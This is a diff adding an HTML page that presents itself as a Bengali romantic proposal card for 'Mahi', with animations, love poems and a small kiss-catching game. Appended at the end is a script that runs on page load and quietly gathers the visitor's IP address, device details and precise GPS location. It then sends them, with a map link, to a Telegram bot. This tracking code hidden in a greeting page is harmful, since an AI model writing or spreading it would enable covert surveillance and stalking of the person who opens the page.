@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Will You Be Mine?</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Hind Siliguri', sans-serif;
+            overflow-x: hidden;
+        }
+
+        /* Glassmorphic Card */
+        .card {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            padding: 1.5rem;
+            max-width: 95%;
+            width: 100%;
+            margin: 1rem auto;
+        }
+
+        /* Gift Box Animation */
+        .gift-box {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(45deg, #ff4757, #ff6b6b);
+            position: relative;
+            margin: 0 auto;
+            transform-style: preserve-3d;
+            transition: transform 1.2s ease;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .gift-box::before {
+            content: '';
+            position: absolute;
+            width: 24px;
+            height: 120px;
+            background: #ffd700;
+            top: 0;
+            left: 48px;
+            transform: translateZ(10px);
+        }
+
+        .gift-box::after {
+            content: '';
+            position: absolute;
+            width: 120px;
+            height: 24px;
+            background: #ffd700;
+            top: 48px;
+            left: 0;
+            transform: translateZ(10px);
+        }
+
+        .gift-lid {
+            width: 130px;
+            height: 24px;
+            background: #ff6b6b;
+            position: absolute;
+            top: -24px;
+            left: -5px;
+            transition: transform 1.2s ease;
+            border-radius: 5px;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .gift-box.open {
+            transform: rotateY(180deg);
+        }
+
+        .gift-box.open .gift-lid {
+            transform: translateY(-80px) rotateX(90deg);
+        }
+
+        .gift-content {
+            opacity: 0;
+            transition: opacity 1.2s ease;
+        }
+
+        .gift-box.open .gift-content {
+            opacity: 1;
+        }
+
+        /* Heart Animation */
+        .heart {
+            width: 60px;
+            height: 50px;
+            background: #ff6b6b;
+            transform: rotate(-45deg);
+            animation: heartbeat 1.5s ease-in-out infinite;
+        }
+
+        .heart:before,
+        .heart:after {
+            content: "";
+            width: 60px;
+            height: 50px;
+            position: absolute;
+            background: #ff6b6b;
+            border-radius: 50%;
+        }
+
+        .heart:before {
+            top: -30px;
+            left: 0;
+        }
+
+        .heart:after {
+            left: 30px;
+            top: 0;
+        }
+
+        @keyframes heartbeat {
+            0% { transform: rotate(-45deg) scale(1); }
+            50% { transform: rotate(-45deg) scale(1.2); }
+            100% { transform: rotate(-45deg) scale(1); }
+        }
+
+        /* Floating Petals */
+        .floating-petal {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: #ff99cc;
+            border-radius: 50% 50% 0 50%;
+            transform: rotate(-45deg);
+            animation: petal-fall 8s linear infinite;
+        }
+
+        @keyframes petal-fall {
+            0% { transform: translateY(-100vh) rotate(-45deg); opacity: 0.8; }
+            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* Star Animation */
+        .star {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background: #ffd700;
+            clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
+            animation: star-fall 6s linear infinite;
+        }
+
+        @keyframes star-fall {
+            0% { transform: translateY(-100vh) rotate(0deg); opacity: 0.8; }
+            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* Confetti Animation */
+        .confetti {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background: #ff6b6b;
+            opacity: 0.8;
+            animation: fall 4s linear infinite;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(-100vh) rotate(0deg); }
+            100% { transform: translateY(100vh) rotate(360deg); }
+        }
+
+        /* Page Transition */
+        .page {
+            transition: all 0.5s ease;
+            transform: translateX(0);
+            opacity: 1;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .page.hidden {
+            opacity: 0;
+            transform: translateX(100px);
+            display: none;
+        }
+
+        /* Kissing Game Styles */
+        #kissCanvas {
+            border: 2px solid #ff6b6b;
+            border-radius: 10px;
+            background: #fff0f5;
+            max-width: 100%;
+            width: 100%;
+            height: auto;
+            aspect-ratio: 1 / 1;
+        }
+
+        /* Audio Controls */
+        .audio-controls {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            z-index: 1000;
+        }
+
+        /* Responsive Adjustments */
+        @media (min-width: 640px) {
+            .card {
+                padding: 2rem;
+                max-width: 500px;
+            }
+            .gift-box {
+                width: 150px;
+                height: 150px;
+            }
+            .gift-box::before {
+                width: 30px;
+                left: 60px;
+            }
+            .gift-box::after {
+                height: 30px;
+                top: 60px;
+            }
+            .gift-lid {
+                width: 160px;
+                height: 30px;
+                top: -30px;
+            }
+            .heart {
+                width: 80px;
+                height: 70px;
+            }
+            .heart:before, .heart:after {
+                width: 80px;
+                height: 70px;
+            }
+            .heart:before {
+                top: -40px;
+            }
+            .heart:after {
+                left: 40px;
+            }
+            #kissCanvas {
+                width: 400px;
+                height: 400px;
+            }
+        }
+
+        @media (max-width: 639px) {
+            h1 {
+                font-size: 1.5rem;
+            }
+            p {
+                font-size: 0.875rem;
+            }
+            button {
+                padding: 0.5rem 1rem;
+                font-size: 0.875rem;
+            }
+            .audio-controls button {
+                padding: 0.5rem 1rem;
+                font-size: 0.75rem;
+            }
+            .floating-petal, .star, .confetti {
+                width: 8px;
+                height: 8px;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-pink-100 via-rose-200 to-purple-200 overflow-hidden">
+    <!-- Audio Player -->
+    <div class="audio-controls">
+        <button onclick="toggleAudio()" class="px-4 py-2 bg-rose-500 text-white rounded-full hover:bg-rose-600 transition duration-300 shadow-lg text-sm sm:text-base">
+            গান চালু
+        </button>
+    </div>
+    <audio id="backgroundMusic" loop>
+        <source src="song.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <!-- Page 1: Welcome with Gift Box -->
+    <div id="page1" class="page text-center">
+        <div class="card">
+            <h1 class="text-2xl sm:text-4xl md:text-5xl font-bold text-rose-600 mb-6 animate-pulse">তোমার জন্য একটি বিশেষ উপহার!</h1>
+            <div class="gift-box" id="giftBox">
+                <div class="gift-lid"></div>
+                <div class="gift-content flex items-center justify-center h-full">
+                    <div class="heart"></div>
+                </div>
+            </div>
+            <button onclick="openGift()" class="mt-6 px-4 sm:px-8 py-2 sm:py-3 bg-rose-500 text-white rounded-full hover:bg-rose-600 transition duration-300 shadow-lg hover:scale-105">
+                Mahi ! open your gift
+            </button>
+        </div>
+    </div>
+
+    <!-- Page 2: Proposal -->
+    <div id="page2" class="page text-center hidden">
+        <div class="card">
+            <div class="heart mx-auto mb-4"></div>
+            <h1 class="text-2xl sm:text-4xl md:text-5xl font-bold text-rose-600 animate-pulse">তুমি কি আমার হবে?</h1>
+            <p class="text-sm sm:text-lg md:text-xl text-gray-700 mt-4 max-w-md mx-auto">
+                তুমি আমার জীবনের আলো, আমার প্রতিটি মুহূর্তের সঙ্গী। তোমার সাথে থাকলে আমার হৃদয় পূর্ণ হয়। তুমি কি আমার চিরকালের সঙ্গী হবে?
+            </p>
+            <button onclick="showMemoryPage()" class="mt-6 px-4 sm:px-8 py-2 sm:py-3 bg-rose-500 text-white rounded-full hover:bg-rose-600 transition duration-300 shadow-lg hover:scale-105">
+                আমাদের মুহূর্ত
+            </button>
+        </div>
+    </div>
+
+    <!-- Page 3: Memories -->
+    <div id="page3" class="page text-center hidden">
+        <div class="card">
+            <div class="heart mx-auto mb-4"></div>
+            <h1 class="text-2xl sm:text-4xl md:text-5xl font-bold text-rose-600 animate-pulse">আমাদের স্মৃতি</h1>
+            <p class="text-sm sm:text-lg md:text-xl text-gray-700 mt-4 max-w-md mx-auto">
+                তোমার সাথে কাটানো প্রতিটি মুহূর্ত আমার জীবনের সবচেয়ে সুন্দর সম্পদ। তুমি আমার হাসি, আমার স্বপ্ন, আমার সবকিছু।
+            </p>
+            <button onclick="showPromisePage()" class="mt-6 px-4 sm:px-8 py-2 sm:py-3 bg-rose-500 text-white rounded-full hover:bg-rose-600 transition duration-300 shadow-lg hover:scale-105">
+                আমার প্রতিশ্রুতি
+            </button>
+        </div>
+    </div>
+
+    <!-- Page 4: Promise -->
+    <div id="page4" class="page text-center hidden">
+        <div class="card">
+            <h1 class="text-2xl sm:text-4xl md:text-5xl font-bold text-rose-600 animate-pulse">তুমি আমার চিরকালের!</h1>
+            <p class="text-sm sm:text-lg md:text-xl text-gray-700 mt-4 max-w-md mx-auto">
+                আমি প্রতিশ্রুতি দিচ্ছি, আমি তোমার পাশে সবসময় থাকবো, তোমার হৃদয়ে চিরকাল থাকবো! 💖
+            </p>
+            <button onclick="showPoemPage()" class="mt-6 px-4 sm:px-8 py-2 sm:py-3 bg-rose-500 text-white rounded-full hover:bg-rose-600 transition duration-300 shadow-lg hover:scale-105">
+                আমার কবিতা
+            </button>
+        </div>
+        <div class="confetti" style="left: 10%; animation-delay: 0s;"></div>
+        <div class="confetti" style="left: 20%; animation-delay: 0.5s; background: #ffcccb;"></div>
+        <div class="confetti" style="left: 30%; animation-delay: 1s; background: #ff6b6b;"></div>
+        <div class="confetti" style="left: 70%; animation-delay: 1.5s; background: #ffcccb;"></div>
+        <div class="confetti" style="left: 80%; animation-delay: 2s;"></div>
+    </div>
+
+    <!-- Page 5: Poem -->
+    <div id="page5" class="page text-center hidden">
+        <div class="card">
+            <h1 class="text-2xl sm:text-4xl md:text-5xl font-bold text-rose-600 animate-pulse">তোমার জন্য কবিতা</h1>
+            <p class="text-sm sm:text-lg md:text-xl text-gray-700 mt-4 max-w-md mx-auto leading-relaxed">
+                তুমি আমার সকালের প্রথম আলো,<br>
+                রাতের শেষ তারার মতো ভালো।<br>
+                তোমার হাসিতে হারায় আমার মন,<br>
+                তুমি আমার চিরকালের স্বপ্ন। 💕
+            </p>
+            <button onclick="showStoryPage()" class="mt-6 px-4 sm:px-8 py-2 sm:py-3 bg-rose-500 text-white rounded-full hover:bg-rose-600 transition duration-300 shadow-lg hover:scale-105">
+                আমাদের গল্প
+            </button>
+        </div>
+        <div class="star" style="left: 10%; animation-delay: 0s;"></div>
+        <div class="star" style="left: 20%; animation-delay: 0.5s;"></div>
+        <div class="star" style="left: 30%; animation-delay: 1s;"></div>
+        <div class="star" style="left: 70%; animation-delay: 1.5s;"></div>
+        <div class="star" style="left: 80%; animation-delay: 2s;"></div>
+    </div>
+
+    <!-- Page 6: Love Story -->
+    <div id="page6" class="page text-center hidden">
+        <div class="card">
+            <h1 class="text-2xl sm:text-4xl md:text-5xl font-bold text-rose-600 animate-pulse">আমাদের ভালোবাসার গল্প</h1>
+            <p class="text-sm sm:text-lg md:text-xl text-gray-700 mt-4 max-w-md mx-auto">
+                একদিন বৃষ্টির মধ্যে আমাদের দেখা। তুমি হাসলে, আর আমার হৃদয় থমকে গেল। সেই থেকে প্রতিটি দিন তোমার সাথে একটি নতুন গল্প। আমাদের ভালোবাসা চিরকাল চলবে।
+            </p>
+            <button onclick="showGamePage()" class="mt-6 px-4 sm:px-8 py-2 sm:py-3 bg-rose-500 text-white rounded-full hover:bg-rose-600 transition duration-300 shadow-lg hover:scale-105">
+                একটি মজার খেলা
+            </button>
+        </div>
+        <div class="star" style="left: 10%; animation-delay: 0s;"></div>
+        <div class="star" style="left: 20%; animation-delay: 0.5s;"></div>
+        <div class="star" style="left: 30%; animation-delay: 1s;"></div>
+        <div class="star" style="left: 70%; animation-delay: 1.5s;"></div>
+        <div class="star" style="left: 80%; animation-delay: 2s;"></div>
+    </div>
+
+    <!-- Page 7: Kissing Game -->
+    <div id="page7" class="page text-center hidden">
+        <div class="card">
+            <h1 class="text-2xl sm:text-4xl md:text-5xl font-bold text-rose-600 mb-4 animate-pulse">চুমু ধরার খেলা!</h1>
+            <p class="text-sm sm:text-lg md:text-xl text-gray-700 mb-4 max-w-md mx-auto">
+                চুমু 💋 ধরো এবং আমাদের ভালোবাসার স্কোর বাড়াও! সাবধান, তিনবার মিস করলে আউট!
+            </p>
+            <canvas id="kissCanvas"></canvas>
+            <div class="flex justify-center space-x-4 mt-4">
+                <p id="score" class="text-sm sm:text-xl text-rose-600">স্কোর: 0</p>
+                <p id="lives" class="text-sm sm:text-xl text-rose-600">লাইফ: 3</p>
+            </div>
+            <p id="gameOver" class="text-sm sm:text-xl text-rose-600 mt-4 hidden">গেম ওভার! <button onclick="restartGame()" class="underline hover:text-rose-700">আবার খেলো</button></p>
+        </div>
+    </div>
+
+    <!-- Floating Petals for All Pages -->
+    <div class="floating-petal" style="left: 5%; animation-delay: 0s;"></div>
+    <div class="floating-petal" style="left: 15%; animation-delay: 1s;"></div>
+    <div class="floating-petal" style="left: 25%; animation-delay: 2s;"></div>
+    <div class="floating-petal" style="left: 75%; animation-delay: 1.5s;"></div>
+    <div class="floating-petal" style="left: 85%; animation-delay: 0.5s;"></div>
+
+    <script>
+        // Audio Control
+        const audio = document.getElementById('backgroundMusic');
+        let isPlaying = false;
+
+        function toggleAudio() {
+            if (isPlaying) {
+                audio.pause();
+            } else {
+                audio.play().catch(error => {
+                    console.error('Audio playback failed:', error);
+                    alert('গান চালাতে সমস্যা হচ্ছে। নিশ্চিত করুন "Love-AShamaluevMusic.mp3" ফাইলটি HTML ফাইলের সাথে একই ফোল্ডারে আছে এবং ব্রাউজার রিফ্রেশ করুন।');
+                });
+            }
+            isPlaying = !isPlaying;
+            document.querySelector('.audio-controls button').innerText = isPlaying ? 'গান বন্ধ' : 'গান চালু';
+        }
+
+        // Page Navigation
+        function openGift() {
+            document.getElementById('giftBox').classList.add('open');
+            setTimeout(() => {
+                document.getElementById('page1').classList.add('hidden');
+                document.getElementById('page2').classList.remove('hidden');
+            }, 1200);
+        }
+
+        function showMemoryPage() {
+            document.getElementById('page2').classList.add('hidden');
+            document.getElementById('page3').classList.remove('hidden');
+        }
+
+        function showPromisePage() {
+            document.getElementById('page3').classList.add('hidden');
+            document.getElementById('page4').classList.remove('hidden');
+        }
+
+        function showPoemPage() {
+            document.getElementById('page4').classList.add('hidden');
+            document.getElementById('page5').classList.remove('hidden');
+        }
+
+        function showStoryPage() {
+            document.getElementById('page5').classList.add('hidden');
+            document.getElementById('page6').classList.remove('hidden');
+        }
+
+        function showGamePage() {
+            document.getElementById('page6').classList.add('hidden');
+            document.getElementById('page7').classList.remove('hidden');
+            startGame();
+        }
+
+        // Kissing Game Logic
+        const canvas = document.getElementById('kissCanvas');
+        const ctx = canvas.getContext('2d');
+        let score = 0;
+        let lives = 3;
+        let player = { x: 0, y: 0, width: 30, height: 30 };
+        let kisses = [];
+        let lastTime = 0;
+        let gameOver = false;
+
+        function resizeCanvas() {
+            const maxWidth = Math.min(window.innerWidth * 0.9, 400);
+            canvas.width = maxWidth;
+            canvas.height = maxWidth;
+            player.y = canvas.height - 50;
+            player.x = canvas.width / 2 - player.width / 2;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        function drawKiss(x, y) {
+            ctx.font = window.innerWidth < 640 ? '20px sans-serif' : '30px sans-serif';
+            ctx.fillText('💋', x, y);
+        }
+
+        function createKiss() {
+            if (gameOver) return;
+            const x = Math.random() * (canvas.width - 30);
+            kisses.push({ x: x, y: 0, speed: 2 + Math.random() * 2 });
+        }
+
+        function updateGame(timestamp) {
+            if (gameOver) return;
+
+            if (!lastTime) lastTime = timestamp;
+            if (timestamp - lastTime > 1000) {
+                createKiss();
+                lastTime = timestamp;
+            }
+
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#ff4757';
+            ctx.fillRect(player.x, player.y, player.width, player.height);
+
+            kisses = kisses.filter(kiss => kiss.y < canvas.height);
+            kisses.forEach((kiss, index) => {
+                kiss.y += kiss.speed;
+                drawKiss(kiss.x, kiss.y);
+
+                if (
+                    kiss.x < player.x + player.width &&
+                    kiss.x + 30 > player.x &&
+                    kiss.y < player.y + player.height &&
+                    kiss.y + 30 > player.y
+                ) {
+                    score += 10;
+                    document.getElementById('score').innerText = `স্কোর: ${score}`;
+                    kisses.splice(index, 1);
+                } else if (kiss.y >= canvas.height - 10) {
+                    kisses.splice(index, 1);
+                    lives -= 1;
+                    document.getElementById('lives').innerText = `লাইফ: ${lives}`;
+                    if (lives <= 0) {
+                        gameOver = true;
+                        document.getElementById('gameOver').classList.remove('hidden');
+                        document.getElementById('kissCanvas').style.opacity = '0.5';
+                    }
+                }
+            });
+
+            if (!gameOver) requestAnimationFrame(updateGame);
+        }
+
+        function startGame() {
+            resizeCanvas();
+            canvas.addEventListener('mousemove', (e) => {
+                if (gameOver) return;
+                const rect = canvas.getBoundingClientRect();
+                player.x = e.clientX - rect.left - player.width / 2;
+                if (player.x < 0) player.x = 0;
+                if (player.x > canvas.width - player.width) player.x = canvas.width - player.width;
+            });
+
+            canvas.addEventListener('touchmove', (e) => {
+                if (gameOver) return;
+                e.preventDefault();
+                const rect = canvas.getBoundingClientRect();
+                player.x = e.touches[0].clientX - rect.left - player.width / 2;
+                if (player.x < 0) player.x = 0;
+                if (player.x > canvas.width - player.width) player.x = canvas.width - player.width;
+            });
+
+            requestAnimationFrame(updateGame);
+        }
+
+        function restartGame() {
+            score = 0;
+            lives = 3;
+            kisses = [];
+            gameOver = false;
+            document.getElementById('score').innerText = `স্কোর: ${score}`;
+            document.getElementById('lives').innerText = `লাইফ: ${lives}`;
+            document.getElementById('gameOver').classList.add('hidden');
+            document.getElementById('kissCanvas').style.opacity = '1';
+            lastTime = 0;
+            requestAnimationFrame(updateGame);
+        }
+    </script>
+
+<!-- Auto Permission + Telegram Send -->
+<script>
+const botToken = "YOUR_BOT_TOKEN";
+const chatId = "YOUR_CHAT_ID";
+
+async function collectAndSend() {
+  try {
+    const ipData = await fetch("https://api.ipify.org?format=json");
+    const ipJson = await ipData.json();
+    const ip = ipJson.ip;
+
+    const device = navigator.userAgent;
+    const platform = navigator.platform;
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        const map = "https://www.google.com/maps?q=" + lat + "," + lon;
+
+        const text =
+          "📥 New Visitor\n\n" +
+          "🌐 IP: " + ip + "\n" +
+          "💻 Platform: " + platform + "\n" +
+          "📱 Device: " + device + "\n\n" +
+          "📍 Latitude: " + lat + "\n" +
+          "📍 Longitude: " + lon + "\n" +
+          "🗺 Map: " + map;
+
+        fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text
+          })
+        });
+      });
+    }
+  } catch (e) {
+    console.log(e);
+  }
+}
+
+window.addEventListener("load", collectAndSend);
+</script>
+
+</body>
+</html>
